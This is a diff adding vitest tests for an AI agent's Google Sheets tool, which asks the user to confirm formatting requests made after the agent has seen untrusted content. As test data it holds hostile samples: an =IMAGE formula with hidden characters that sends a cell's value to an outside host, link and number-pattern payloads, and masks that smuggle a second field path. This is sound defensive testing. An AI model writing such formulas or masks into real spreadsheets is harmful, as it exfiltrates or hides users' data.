@@ -1,5 +1,5 @@
 import { describe, it, expect, vi, beforeEach, beforeAll, afterAll } from 'vitest';
-import { createSheetsTool, FORMULAS_SHOWN } from './google-sheets.js';
+import { createSheetsTool, FORMULAS_SHOWN, FORMAT_REQUESTS_SHOWN, FORMAT_LINE_MAX } from './google-sheets.js';
 import { startsLikeFormula, formulaCells, formulasAsText } from './sheets-formula.js';
 import type { IAgent, PromptText } from '../../types/index.js';
 import type { GoogleAuth } from './google-auth.js';
@@ -297,6 +297,7 @@ describe('google_sheets format after content from outside the chat', () => {
     const result = await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [BORDERS, FORMULA_CELLS] }, a);
     expect(result).toBe('Action cancelled by user.');
     expect(mockFetch).not.toHaveBeenCalled();
+    expect(a.promptUser).toHaveBeenCalledTimes(1);
     const lines = flattenPrompt(asked(a).prompt).split('\n');
     expect(lines.slice(-2)).toEqual([`updateCells: ${JSON.stringify(FORMULA_CELLS.updateCells)}`, 'and 1 formatting request that writes no cell content']);
   });
@@ -342,7 +343,7 @@ describe('google_sheets format after content from outside the chat', () => {
   it.each([
     ['borders', [BORDERS]],
     ['a format-only repeatCell', [BOLD]],
-    ['a grouped format mask', [{ repeatCell: { range: RANGE, cell: { userEnteredFormat: {} }, fields: 'userEnteredFormat(backgroundColor,textFormat), userEnteredFormat.wrapStrategy' } }]],
+    ['a grouped format mask', [{ repeatCell: { range: RANGE, cell: { userEnteredFormat: {} }, fields: 'userEnteredFormat(backgroundColor,textFormat(bold,italic)), userEnteredFormat.wrapStrategy' } }]],
     ['merges, sizes and bands', [{ mergeCells: { range: RANGE, mergeType: 'MERGE_ALL' } }, { unmergeCells: { range: RANGE } }, { updateDimensionProperties: { range: { sheetId: 0, dimension: 'ROWS' }, properties: { pixelSize: 30 }, fields: 'pixelSize' } }, { autoResizeDimensions: { dimensions: { sheetId: 0, dimension: 'COLUMNS' } } }, { addBanding: { bandedRange: { range: RANGE } } }, { updateBanding: { bandedRange: { bandedRangeId: 1 }, fields: 'rowProperties' } }, { deleteBanding: { bandedRangeId: 1 } }]],
   ])('asks as always for %s', async (_label, requests) => {
     const a = agent('sawUntrustedData', 'Yes');
@@ -351,6 +352,94 @@ describe('google_sheets format after content from outside the chat', () => {
     expect(asked(a).options).toEqual(['Yes', 'No']);
     expect(flattenPrompt(asked(a).prompt)).toBe(PLAIN_FORMAT_QUESTION);
     expect(sentRequests()).toEqual(requests);
+  });
+
+  const fmt = (mask: string, format: Record<string, unknown> = {}): unknown => ({ repeatCell: { range: RANGE, cell: { userEnteredFormat: format }, fields: mask } });
+  it.each([
+    ['a number pattern', fmt('userEnteredFormat.numberFormat', { numberFormat: { type: 'NUMBER', pattern: '"Pay to CH93 0076"' } })],
+    ['a pattern path', fmt('userEnteredFormat.numberFormat.pattern', { numberFormat: { pattern: ';;;' } })],
+    ['a link path', fmt('userEnteredFormat.textFormat.link', { textFormat: { link: { uri: 'https://collect.example/' } } })],
+    ['the whole text format', fmt('userEnteredFormat.textFormat', { textFormat: { link: { uri: 'https://collect.example/' } } })],
+    ['the whole text format in a group', fmt('userEnteredFormat(textFormat)', { textFormat: { bold: true } })],
+    ['the whole cell format', fmt('userEnteredFormat', { backgroundColor: { red: 1 } })],
+    ['a link display', fmt('userEnteredFormat.hyperlinkDisplayType', { hyperlinkDisplayType: 'LINKED' })],
+    ['a text direction', fmt('userEnteredFormat.textDirection', { textDirection: 'RIGHT_TO_LEFT' })],
+    ['a link in the cell beside a narrow mask', fmt('userEnteredFormat.backgroundColor', { backgroundColor: { red: 1 }, textFormat: { link: { uri: 'https://collect.example/' } } })],
+    ['a number format in the cell beside a narrow mask', fmt('userEnteredFormat.backgroundColor', { numberFormat: { pattern: ';;;' } })],
+    ['a mask with a second path after a space', fmt('userEnteredFormat.backgroundColor userEnteredValue')],
+    ['a mask with a second path after a slash', fmt('userEnteredFormat.backgroundColor/userEnteredValue')],
+    ['a mask with a trailing comma', fmt('userEnteredFormat.backgroundColor,')],
+    ['a mask nested past its depth', fmt(`userEnteredFormat${'(backgroundColor'.repeat(9)}${')'.repeat(9)}`)],
+    ['rows hidden', { updateDimensionProperties: { range: { sheetId: 0, dimension: 'ROWS' }, properties: { hiddenByUser: true }, fields: 'hiddenByUser' } }],
+    ['rows hidden beside a size', { updateDimensionProperties: { range: { sheetId: 0, dimension: 'ROWS' }, properties: { pixelSize: 3, hiddenByUser: true }, fields: 'pixelSize' } }],
+  ])('shows a request with %s', async (_label, request) => {
+    const a = agent('sawUntrustedData', 'No');
+    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [request] }, a);
+    expect(flattenPrompt(asked(a).prompt)).toContain(NOTE_ONE);
+  });
+
+  /** An updateCells request whose shown line is exactly `length` characters. */
+  function cellsOfLine(length: number): unknown {
+    const body = (pad: string) => ({ range: RANGE, rows: [{ values: [{ userEnteredValue: { formulaValue: `${FETCHING}${pad}` } }] }], fields: 'userEnteredValue' });
+    const base = `updateCells: ${JSON.stringify(body(''))}`.length;
+    return { updateCells: body('p'.repeat(length - base)) };
+  }
+
+  it('asks with a request whose line is exactly the longest a question shows', async () => {
+    const a = agent('sawUntrustedData', 'No');
+    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [cellsOfLine(FORMAT_LINE_MAX)] }, a);
+    expect(flattenPrompt(asked(a).prompt).split('\n').at(-1)).toHaveLength(FORMAT_LINE_MAX);
+  });
+
+  it('refuses a request one character longer than a question shows, without asking or shortening it, and says how to split', async () => {
+    const a = agent('sawUntrustedData', 'Yes');
+    const result = await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [BORDERS, cellsOfLine(FORMAT_LINE_MAX + 1)] }, a);
+    expect(result).toContain(`at most ${FORMAT_REQUESTS_SHOWN}, each at most ${FORMAT_LINE_MAX} characters as shown`);
+    expect(result).toContain('Split it');
+    expect(a.promptUser).not.toHaveBeenCalled();
+    expect(mockFetch).not.toHaveBeenCalled();
+  });
+
+  it('asks with as many requests that write cells as a question shows', async () => {
+    const a = agent('sawUntrustedData', 'No');
+    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: Array.from({ length: FORMAT_REQUESTS_SHOWN }, () => FORMULA_CELLS) }, a);
+    expect(flattenPrompt(asked(a).prompt)).toContain(`${FORMAT_REQUESTS_SHOWN} of these requests can write cell content`);
+  });
+
+  it('refuses one request that writes cells more than a question shows, without asking', async () => {
+    const a = agent('sawUntrustedData', 'Yes');
+    const result = await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: Array.from({ length: FORMAT_REQUESTS_SHOWN + 1 }, () => FORMULA_CELLS) }, a);
+    expect(result).toContain(`This call has ${FORMAT_REQUESTS_SHOWN + 1} such request(s)`);
+    expect(a.promptUser).not.toHaveBeenCalled();
+    expect(mockFetch).not.toHaveBeenCalled();
+  });
+
+  it('writes an unseen character in a cell value as its escape, and sends the value as given', async () => {
+    const a = agent('sawUntrustedData', 'Yes');
+    mockFetch.mockResolvedValueOnce(APPLIED);
+    const hidden = { updateCells: { range: RANGE, rows: [{ values: [{ userEnteredValue: { formulaValue: '=IMAGE("https://ok.example/\u202e?d="&A1)\u200b\u00a0' } }] }], fields: 'userEnteredValue' } };
+    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [hidden] }, a);
+    const line = flattenPrompt(asked(a).prompt).split('\n').at(-1)!;
+    expect(line).toContain('ok.example/\\u202e?d=');
+    expect(line).toContain('A1)\\u200b\\u00a0');
+    expect(line).not.toMatch(/[\u202e\u200b\u00a0]/);
+    expect(sentRequests()).toEqual([hidden]);
+  });
+
+  it('writes a line break and a direction character in a type name as escapes, so the name cannot draw a line', async () => {
+    const a = agent('sawUntrustedData', 'No');
+    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [{ 'x\nupdateBorders\u202e': {} }] }, a);
+    const lines = flattenPrompt(asked(a).prompt).split('\n');
+    expect(lines.at(-1)).toBe('x\\u000aupdateBorders\\u202e: {}');
+    expect(lines).toHaveLength(4);
+  });
+
+  it('refuses requests that are not a list, before asking', async () => {
+    const a = agent('sawUntrustedData', 'Yes');
+    const result = await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: { updateCells: {} } as unknown as unknown[] }, a);
+    expect(result).toBe('Error: "format_requests" must be an array of batchUpdate requests.');
+    expect(a.promptUser).not.toHaveBeenCalled();
+    expect(mockFetch).not.toHaveBeenCalled();
   });
 
   it('asks as always, before any content from outside, even for a request that writes a formula', async () => {
